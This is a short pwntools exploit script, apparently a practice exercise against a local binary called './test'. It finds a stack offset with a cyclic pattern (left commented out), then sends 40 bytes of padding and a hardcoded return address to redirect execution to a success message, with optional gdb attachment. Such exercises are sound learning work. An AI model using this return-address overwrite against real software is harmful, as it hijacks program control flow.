#!/usr/bin/python
import sys
import argparse
from pwn import *

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  args = parser.parse_args()

  r = process('./test')

  if args.dbg:
    gdb.attach(r, """
    vmmap
    b *main+25
    """)

  # attempt 1, set break at main+63
  """ 
  payload  = ""
  payload += cyclic(50)
  print r.send(payload)
  """

  # attempt 2, set break at main+63, found offset in previous step
  payload  = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa"
  payload += p64(0x400589)   # this is the return address. 
                             # Makes the success print out (found by using gdb) 
  print r.sendline(payload)
  
  
  # Drop to interactive console
  r.interactive()

